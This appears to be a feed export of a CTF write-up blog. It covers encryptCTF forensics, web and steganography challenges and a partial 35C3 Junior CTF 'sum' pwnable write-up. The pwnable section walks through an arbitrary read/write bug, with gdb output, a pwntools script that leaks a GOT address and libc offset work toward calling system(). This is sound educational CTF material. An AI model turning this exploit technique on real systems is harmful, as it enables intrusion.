		&lt;/span&gt;mv &lt;span class=&quot;nv&quot;&gt;$filename&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filename&lt;/span&gt;.bz2
		bunzip2 &lt;span class=&quot;nv&quot;&gt;$filename&lt;/span&gt;.bz2 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /dev/null
		&lt;span class=&quot;nv&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;)&lt;/span&gt;	
	&lt;span class=&quot;k&quot;&gt;fi

	&lt;/span&gt;file &lt;span class=&quot;nv&quot;&gt;$filename&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Zip&quot;&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$?&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-eq&lt;/span&gt; 0 &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;then
		&lt;/span&gt;mv &lt;span class=&quot;nv&quot;&gt;$filename&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filename&lt;/span&gt;.zip
		unzip &lt;span class=&quot;nv&quot;&gt;$filename&lt;/span&gt;.zip &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /dev/null
		rm &lt;span class=&quot;nv&quot;&gt;$filename&lt;/span&gt;.zip &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /dev/null 2&amp;gt;&amp;amp;1
		&lt;span class=&quot;nv&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;)&lt;/span&gt;	
	&lt;span class=&quot;k&quot;&gt;fi

	&lt;/span&gt;file &lt;span class=&quot;nv&quot;&gt;$filename&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;gzip&quot;&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$?&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-eq&lt;/span&gt; 0 &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;then
		&lt;/span&gt;mv &lt;span class=&quot;nv&quot;&gt;$filename&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filename&lt;/span&gt;.gz
		gunzip &lt;span class=&quot;nv&quot;&gt;$filename&lt;/span&gt;.gz &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /dev/null
		&lt;span class=&quot;nv&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;fi

	&lt;/span&gt;file &lt;span class=&quot;nv&quot;&gt;$filename&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;ASCII&quot;&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$?&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-eq&lt;/span&gt; 0 &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;then
		&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo 
		echo
		echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Flag Found!&quot;&lt;/span&gt;
		&lt;span class=&quot;nb&quot;&gt;echo
		cat&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$filename&lt;/span&gt;
		&lt;span class=&quot;nb&quot;&gt;echo
		echo
		break
	&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;fi
done&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This script directly spits out the flag,&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;FLAG: encryptCTF{f33ls_g00d_d0nt_it?}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now, one thing is that I am not gonna explicitly explain every line of the code, cz &lt;a href=&quot;https://www.youtube.com/user/RootOfTheNull&quot;&gt;John Hammond&lt;/a&gt; actually has done a &lt;a href=&quot;https://www.youtube.com/watch?v=wRSwagjvSqU&quot;&gt;writeup video&lt;/a&gt; on a similar challenge.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;YeAh, I know what you thinkin’ it was copied. OMG!&lt;/em&gt;&lt;/p&gt;

&lt;h4 id=&quot;thankyou-for-reading-happy-hackin--eshaan7&quot;&gt;Thankyou for reading, happy hackin’! ~ &lt;a href=&quot;https://eshaan7.cf/&quot;&gt;eshaan7&lt;/a&gt;&lt;/h4&gt;</content><author><name>eshaan7</name></author><summary type="html">Challenge: Journey to the centre of the file 2(for 150 points, static) [Forensics]</summary></entry><entry><title type="html">Encryptctf Slashslash</title><link href="http://localhost:4000/2019/04/04/encryptctf-slashslash.html" rel="alternate" type="text/html" title="Encryptctf Slashslash" /><published>2019-04-04T00:00:00+05:30</published><updated>2019-04-04T00:00:00+05:30</updated><id>http://localhost:4000/2019/04/04/encryptctf-slashslash</id><content type="html" xml:base="http://localhost:4000/2019/04/04/encryptctf-slashslash.html">&lt;h3 id=&quot;challenge-slash-slashfor-50-points-static-web&quot;&gt;Challenge: Slash Slash(for 50 points, static) [WEB]&lt;/h3&gt;

&lt;h4 id=&quot;challenge-description&quot;&gt;Challenge description:&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;//
file: (handout_slashslash.7z[ ]
Author: maskofmydisguise
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;lets-capture-tis-fl4g&quot;&gt;Let’s capture tis fl4g:&lt;/h4&gt;

&lt;p&gt;We are given a &lt;code class=&quot;highlighter-rouge&quot;&gt;handout_slashslash.7z&lt;/code&gt; file here.
It contains a Python virtual environment and a Flask(python) Application returning JSON data (the flag) at /encryptCTF route.
Now, we know that the Flask Application loads the flag from the environment variable FLAG. This Environment Variable is loaded when the virtual environment is activated using&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;source ./env/bin/activate
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;then when we go to the /encryptCTF route we get this,&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-JSON&quot;&gt;flag: encryptCTF{}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;em&gt;LMAOOO000000000000OOOOOOOOOO0000&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;So, we gotta think now and since the &lt;code class=&quot;highlighter-rouge&quot;&gt;application.py&lt;/code&gt; file also includes a link to learn about virtual environments and if we concentrate on the challenge name, what dies that tell us? maybe something important is commented out somewhere ? eh, just a thought.&lt;/p&gt;

&lt;p&gt;Anyhoo, In the env/bin/activate script you will find the environment variable being exported as an env var (all encoded in base64). Simply decode the base64 to get the flag.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;FLAG: encryptCTF{comments_&amp;amp;_indentations_makes_johnny_a_good_programmer}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We could have also ran&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;grep -nir encryptCTF
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;on the app/ and still wouldn’t have got anything.
but, if we do&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;grep -nir `echo &quot;encryptCTF&quot; | base64`
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We get the location of the flag. :)&lt;/p&gt;

&lt;h5 id=&quot;bonus&quot;&gt;BONUS:&lt;/h5&gt;

&lt;p&gt;Virtual environments are awesome!
The purpose is to ease development and also store config, requirements.txt, no need to pip install anything.
I made this challenge to introduce people to environment variables, virtual environment and basic web development using Flask microframework which I love. :)&lt;/p&gt;

&lt;h4 id=&quot;thankyou-for-reading-happy-hackin--eshaan7&quot;&gt;Thankyou for reading, happy hackin’! ~ &lt;a href=&quot;https://eshaan7.cf/&quot;&gt;eshaan7&lt;/a&gt;&lt;/h4&gt;</content><author><name>eshaan7</name></author><summary type="html">Challenge: Slash Slash(for 50 points, static) [WEB]</summary></entry><entry><title type="html">Encryptctf Stressedout</title><link href="http://localhost:4000/2019/04/04/encryptctf-stressedout.html" rel="alternate" type="text/html" title="Encryptctf Stressedout" /><published>2019-04-04T00:00:00+05:30</published><updated>2019-04-04T00:00:00+05:30</updated><id>http://localhost:4000/2019/04/04/encryptctf-stressedout</id><content type="html" xml:base="http://localhost:4000/2019/04/04/encryptctf-stressedout.html">&lt;h3 id=&quot;challenge-stressed-out-for-100-points-static-steganography&quot;&gt;Challenge: Stressed Out ?(for 100 points, static) [Steganography]&lt;/h3&gt;

&lt;h4 id=&quot;challenge-description&quot;&gt;Challenge description:&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Elliot all stressed out from this hack, that hack, saving the world (yeeeeep, sounds about right) was losing his mind when Mr. Robot handed him this song to relax to.
 
Elliot: It's good. So good, it scratched that part of my mind. The part that doesn't allow good to exist without a condition.
 
Author: maskofmydisguise
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;lets-capture-tis-fl4g&quot;&gt;Let’s capture tis fl4g:&lt;/h4&gt;

&lt;p&gt;We are given a &lt;a href=&quot;https://github.com/mishrasunny174/encrypt-ctf/blob/master/Stego/100_Stressed_out%3F/dontstressoutkiddo.zip&quot;&gt;dontstressoutkiddo.zip&lt;/a&gt; file, we unzip it to find an audio &lt;code class=&quot;highlighter-rouge&quot;&gt;dontstressoutkiddo.wav&lt;/code&gt; which is playing &lt;a href=&quot;https://www.youtube.com/watch?v=pXRviuL6vMY&quot;&gt;Stressed Out by Twenty One Pilots&lt;/a&gt;.
Analyzing with sonic visualizer, trying to find something in the spectrogram, we get nada.&lt;/p&gt;

&lt;p&gt;Proceed as below,&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/abs0lut3pwn4g3/writeups/master/_posts/stressedout.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We do &lt;code class=&quot;highlighter-rouge&quot;&gt;exiftool&lt;/code&gt; and see a string &lt;code class=&quot;highlighter-rouge&quot;&gt;1_4M_Str3ss3d_0ut&lt;/code&gt;, which is not the flag, but it is the password to extract a hidden jpg file using &lt;code class=&quot;highlighter-rouge&quot;&gt;steghide&lt;/code&gt;. 
On closely looking at the extracted &lt;a href=&quot;https://github.com/mishrasunny174/encrypt-ctf/blob/master/Stego/100_Stressed_out%3F/flag.jpg&quot;&gt;flag.jpg&lt;/a&gt; file, we can see there is a flag which can be seen clearly on increasing brightness or using &lt;code class=&quot;highlighter-rouge&quot;&gt;stegsolve.jar&lt;/code&gt; on it.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;FLAG: encryptCTF{tyl3r_j0s3ph_is_4_g0d}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;thankyou-for-reading-happy-hackin--eshaan7&quot;&gt;Thankyou for reading, happy hackin’! ~ &lt;a href=&quot;https://eshaan7.cf/&quot;&gt;eshaan7&lt;/a&gt;&lt;/h4&gt;</content><author><name>eshaan7</name></author><summary type="html">Challenge: Stressed Out ?(for 100 points, static) [Steganography]</summary></entry><entry><title type="html">35c3 Junior Ctf Sum</title><link href="http://localhost:4000/2019/03/05/35C3-junior-ctf-sum.html" rel="alternate" type="text/html" title="35c3 Junior Ctf Sum" /><published>2019-03-05T00:00:00+05:30</published><updated>2019-03-05T00:00:00+05:30</updated><id>http://localhost:4000/2019/03/05/35C3-junior-ctf-sum</id><content type="html" xml:base="http://localhost:4000/2019/03/05/35C3-junior-ctf-sum.html">&lt;h3 id=&quot;challenge-sumfor-143-points&quot;&gt;Challenge: Sum(for 143 points)&lt;/h3&gt;

&lt;pre id=&quot;user-content-taag_output_text&quot;&gt;
           _____ _________________                 __            _               __________________
          |__  // ____/ ____/__  /                / /_  ______  (_)___  _____   / ____/_  __/ ____/
           /_ &amp;lt;/___ \/ /     /_ &amp;lt;   ______   __  / / / / / __ \/ / __ \/ ___/  / /     / / / /_    
         ___/ /___/ / /___ ___/ /  /_____/  / /_/ / /_/ / / / / / /_/ / /     / /___  / / / __/    
        /____/_____/\____//____/            \____/\__,_/_/ /_/_/\____/_/      \____/ /_/ /_/       
&lt;/pre&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                                      143 Points - PWNABLE
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Challenge Description:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                                    Sum it up!
                                    nc 35.207.132.47 22226
                                    Difficulty estimate: easy
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We Are Given a zip file to Download - &lt;a href=&quot;https://github.com/X3eRo0/X3eRo0.github.io/raw/master/sum-b22202e31d8d84ec55a8f7cb698e2d656622f806.zip&quot;&gt;ZIP&lt;/a&gt;. upon extracting we get the actuall binary and libc used on the server. 
So lets try to Execute the binary and see what it does.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;╭─pulkit@pulkit-ER28-0652 ~/Capture_The_Flag/C3CTFs/35c3jctf/pwn/sum_143  
╰─$ ./sum
---------------------
Simple Sum Calculator
---------------------

How many values to you want to sum up?
&amp;gt; 2
Allocated space for 2 values

Enter the values you want to sum up.
You can perform the following operations:
[1] set &amp;lt;x&amp;gt; &amp;lt;d&amp;gt;
    Set the x-th value to d
[2] get &amp;lt;x&amp;gt;
    Read the x-th value
[3] sum
    Calculate the sum of all values and leave the program
[4] bye
    Leave the program                       


Enter the command you want to execute.
[1] set &amp;lt;x&amp;gt; &amp;lt;d&amp;gt;
[2] get &amp;lt;x&amp;gt;
[3] sum
[4] bye

&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So basically it asks us for how many values you want to add up which gives us a hint that maybe its allocating space for that many values. so, i tried to mess around with it, and just after some time i entered a magical value of negative 1.
which gave me a segmentation fault on proceeding with the menu. which is good for us. also we can see that in the menu we have 2 main options of setting &lt;strong&gt;x&lt;/strong&gt;-th value in allocated space to &lt;strong&gt;d&lt;/strong&gt;, and similarly fetching a value at &lt;strong&gt;x&lt;/strong&gt;-th index.&lt;/p&gt;

&lt;p&gt;so lets try to enter -1 in the prompt where it asks us how many values to sum.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;╭─pulkit@pulkit-ER28-0652 ~/Capture_The_Flag/C3CTFs/35c3jctf/pwn/sum_208  
╰─$ ./sum
---------------------
Simple Sum Calculator
---------------------

How many values to you want to sum up?
&amp;gt; -1
Allocated space for 18446744073709551615 values

Enter the values you want to sum up.
You can perform the following operations:
[1] set &amp;lt;x&amp;gt; &amp;lt;d&amp;gt;
    Set the x-th value to d
[2] get &amp;lt;x&amp;gt;
    Read the x-th value
[3] sum
    Calculate the sum of all values and leave the program
[4] bye
    Leave the program                       


Enter the command you want to execute.
[1] set &amp;lt;x&amp;gt; &amp;lt;d&amp;gt;
[2] get &amp;lt;x&amp;gt;
[3] sum
[4] bye

&amp;gt; set 5000 50
[1]    7880 segmentation fault (core dumped)  ./sum
╭─pulkit@pulkit-ER28-0652 ~/Capture_The_Flag/C3CTFs/35c3jctf/pwn/sum_208  
╰─$ 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;and here is the output of dmesg&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;╭─pulkit@pulkit-ER28-0652 ~/Capture_The_Flag/C3CTFs/35c3jctf/pwn/sum_208  
╰─$ dmesg | tail -n 1
[ 3390.576740] sum[7880]: segfault at 9c40 ip 0000000000400ac3 sp 00007fffd29d0d40 error 6 in sum[400000+2000]
╭─pulkit@pulkit-ER28-0652 ~/Capture_The_Flag/C3CTFs/35c3jctf/pwn/sum_208  
╰─$ 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;the Segmentation Fault occured at Instruction Pointer : 0x0400ac3
so lets fire up gdb and look what happened.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;╭─pulkit@pulkit-ER28-0652 ~/Capture_The_Flag/C3CTFs/35c3jctf/pwn/sum_208  
╰─$ gdb ./sum
GNU gdb (Ubuntu 8.2-0ubuntu1~18.04) 8.2
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later &amp;lt;http://gnu.org/licenses/gpl.html&amp;gt;
.........
.........
.........
Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;...
Reading symbols from ./sum...(no debugging symbols found)...done.
gdb-peda$ r
Starting program: /home/pulkit/Capture_The_Flag/C3CTFs/35c3jctf/pwn/sum_208/sum 
---------------------
Simple Sum Calculator
---------------------

How many values to you want to sum up?
&amp;gt; -1
Allocated space for 18446744073709551615 values

Enter the values you want to sum up.
You can perform the following operations:
[1] set &amp;lt;x&amp;gt; &amp;lt;d&amp;gt;
    Set the x-th value to d
[2] get &amp;lt;x&amp;gt;
    Read the x-th value
[3] sum
    Calculate the sum of all values and leave the program
[4] bye
    Leave the program                       


Enter the command you want to execute.
[1] set &amp;lt;x&amp;gt; &amp;lt;d&amp;gt;
[2] get &amp;lt;x&amp;gt;
[3] sum
[4] bye

&amp;gt; set 5000 500

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0x1388 
RBX: 0x7fffffffdc38 --&amp;gt; 0x603670 (&quot;set 5000 500\n&quot;)
RCX: 0x0 
RDX: 0x1f4 
RSI: 0x0 
RDI: 0x7fffffffd5c0 --&amp;gt; 0x303035 ('500')
RBP: 0x7fffffffdc40 --&amp;gt; 0x78 ('x')
RSP: 0x7fffffffdc30 --&amp;gt; 0xffffffffffffffff 
RIP: 0x400ac3 (&amp;lt;calculator+493&amp;gt;:        mov    QWORD PTR [r12+rax*8],rdx)
R8 : 0x0 
R9 : 0x0 
R10: 0x7ffff7b82cc0 --&amp;gt; 0x2000200020002 
R11: 0x400c78 --&amp;gt; 0x6f207865646e4900 ('')
R12: 0x0 
R13: 0x400c95 --&amp;gt; 0x20656854006d7573 ('sum')
R14: 0x400caa --&amp;gt; 0x61766e4900657962 ('bye')
R15: 0x0
EFLAGS: 0x10213 (CARRY parity ADJUST zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x400ab4 &amp;lt;calculator+478&amp;gt;:   cmp    rax,QWORD PTR [rsp]
   0x400ab8 &amp;lt;calculator+482&amp;gt;:   jae    0x4009da &amp;lt;calculator+260&amp;gt;
   0x400abe &amp;lt;calculator+488&amp;gt;:   mov    rdx,QWORD PTR [rsp+0x20]
=&amp;gt; 0x400ac3 &amp;lt;calculator+493&amp;gt;:   mov    QWORD PTR [r12+rax*8],rdx
   0x400ac7 &amp;lt;calculator+497&amp;gt;:   jmp    0x400a54 &amp;lt;calculator+382&amp;gt;
   0x400ac9 &amp;lt;calculator+499&amp;gt;:   mov    rax,QWORD PTR [rsp+0x18]
   0x400ace &amp;lt;calculator+504&amp;gt;:   cmp    rax,QWORD PTR [rsp]
   0x400ad2 &amp;lt;calculator+508&amp;gt;:   jae    0x400af3 &amp;lt;calculator+541&amp;gt;
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdc30 --&amp;gt; 0xffffffffffffffff 
0008| 0x7fffffffdc38 --&amp;gt; 0x603670 (&quot;set 5000 500\n&quot;)
0016| 0x7fffffffdc40 --&amp;gt; 0x78 ('x')
0024| 0x7fffffffdc48 --&amp;gt; 0x1388 
0032| 0x7fffffffdc50 --&amp;gt; 0x1f4 
0040| 0x7fffffffdc58 --&amp;gt; 0x8b364cb51f106b00 
0048| 0x7fffffffdc60 --&amp;gt; 0x0 
0056| 0x7fffffffdc68 --&amp;gt; 0x400bb0 (&amp;lt;__libc_csu_init&amp;gt;:   push   r15)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000000000400ac3 in calculator ()
gdb-peda$ 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;clearly Segmentation Fault Occured in the function calculator because of this statement
                        &lt;strong&gt;mov    QWORD PTR [r12+rax*8],rdx&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;value from rdx is stored at the address [r12+rax*8]
and if you debug the binary in gdb yourself, you will find that rax if the index value that we provide in “set 5000 50”
which means 5000 and rdx is the value we set to it which is 50 in this case&lt;/p&gt;

&lt;p&gt;and if we look a little up in calculator()
we see what is r12&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;   0x000000000040098a &amp;lt;+180&amp;gt;:   call   0x400760 &amp;lt;calloc@plt&amp;gt;
   0x000000000040098f &amp;lt;+185&amp;gt;:   mov    r12,rax
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;when we input -1 calloc returns NULL or 0.so, r12 is 0 if we supply -ve values because you just cant allocate -ve space in memory.&lt;/p&gt;

&lt;p&gt;so this statement just becomes 
                        &lt;strong&gt;mov    QWORD PTR [rax*8],rdx&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;so the vulnerability is clear we have arbitrary read-write primitive.
but first lets try to &lt;strong&gt;get&lt;/strong&gt; something from the binary, lets try to leak the address of puts from the binary
we will do that using pwntools.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rom pwn import *
#context.log_level = &quot;critical&quot;
exe = ELF(&quot;./sum&quot;)
local = True
if local:
        p = process(&quot;./sum&quot;)
else:
        p = remote(&quot;52.15.72.79&quot;, 14012)

puts_got = exe.got.puts/8

p.sendlineafter(&quot;How many values to you want to sum up?\n&amp;gt; &quot;, &quot;-1&quot;)
p.recvuntil(&quot;\n&amp;gt; &quot;)
p.sendline(&quot;get &quot;+str(puts_got))
puts = int(p.recv(16))
log.info( &quot;PUTS: &quot;+hex(puts) )
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;what we do is simply get the got value of puts from binary and send to binary using “get” command and it will spit its value
we receive it and print it on screen. here is script in action.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;╭─pulkit@pulkit-ER28-0652 ~/Capture_The_Flag/C3CTFs/35c3jctf/pwn/sum_208  
╰─$ python exploit.py
[*] '/home/pulkit/Capture_The_Flag/C3CTFs/35c3jctf/pwn/sum_208/sum'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    FORTIFY:  Enabled
[+] Starting local process './sum': pid 9146
[*] PUTS: 0x7fe5fe06e9c0
[*] Stopped process './sum' (pid 9146)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;so we are able to leak the addresses, Now what do we do.
Remember we also have libc, we will use @niklasb’s libc-database to find offsets to system()
here is how i did it. you could also use https://libc.blukat.me&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;╭─pulkit@pulkit-ER28-0652 ~/tools/libc-database  ‹master*› 
╰─$ ./identify libc-2.27.so 
id libc6_2.27-3ubuntu1_amd64
╭─pulkit@pulkit-ER28-0652 ~/tools/libc-database  ‹master*› 
╰─$ strings db/libc6_2.27-3ubuntu1_amd64.symbols | grep &quot;puts &quot;
_IO_puts 00000000000809c0
puts 00000000000809c0
fputs 000000000007f1f0
_IO_fputs 000000000007f1f0
╭─pulkit@pulkit-ER28-0652 ~/tools/libc-database  ‹master*› 
╰─$ strings db/libc6_2.27-3ubuntu1_amd64.symbols | grep &quot;system &quot;
__libc_system 000000000004f440
system 000000000004f440
╭─pulkit@pulkit-ER28-0652 ~/tools/libc-database  ‹master*›
╰─$ 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;now we can calculate libc_base address by subtracting puts offset from libc from leaked puts address.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;.....
.....
#libc offsets

offset_system = 0x04f440
offset_puts = 0x000809c0

libc_base = puts - offset_puts
log.info(&quot;LIBC BASE: &quot;+hex(libc_base))

system = libc_base + offset_system
......
......
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;now what do we do with system() what do we overwrite, system would require an argument. how the hell do we spawn a shell?.
after short moment of rage, i decided to look back in the disassembled calculator() function.&lt;/p&gt;

&lt;p&gt;and noticed something really weird thing.
after we are done with the program we can send “bye” command to exit from the binary.
when we send “bye” it calls free() and with argument as our input.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[----------------------------------registers-----------------------------------]
RAX: 0xffffff00 
RBX: 0x7fffffffdc38 --&amp;gt; 0x6036d0 --&amp;gt; 0xa3120000a657962 ('bye\n')
RCX: 0x0 
RDX: 0x6036d0 --&amp;gt; 0xa3120000a657962 ('bye\n')
RSI: 0x6036d3 --&amp;gt; 0xa3120000a ('\n')
RDI: 0x6036d0 --&amp;gt; 0xa3120000a657962 ('bye\n')
RBP: 0x7fffffffdc40 --&amp;gt; 0x78 ('x')
RSP: 0x7fffffffdc30 --&amp;gt; 0xa ('\n')
RIP: 0x400b41 (&amp;lt;calculator+619&amp;gt;:        call   0x400720 &amp;lt;free@plt&amp;gt;)
R8 : 0x0 
R9 : 0x7ffff7fc7500 (0x00007ffff7fc7500)
R10: 0x603260 (&quot;bye\n9 1\n&quot;)
R11: 0x400c8e --&amp;gt; 0x7300757a25207465 ('et %zu')
R12: 0x603670 --&amp;gt; 0x0 
